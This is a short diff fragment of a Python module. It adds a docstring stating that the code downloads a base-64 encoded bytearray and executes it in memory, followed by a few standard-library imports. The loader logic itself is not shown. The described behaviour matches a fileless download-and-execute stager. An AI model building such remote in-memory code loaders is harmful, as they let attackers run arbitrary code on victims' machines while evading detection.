@@ -1,3 +1,7 @@
+"""
+Downloads a base-64 encoded bytearray object and executes the datagram in memory.
+"""
+
 from gc import collect
 from sys import argv
 from contextlib import suppress
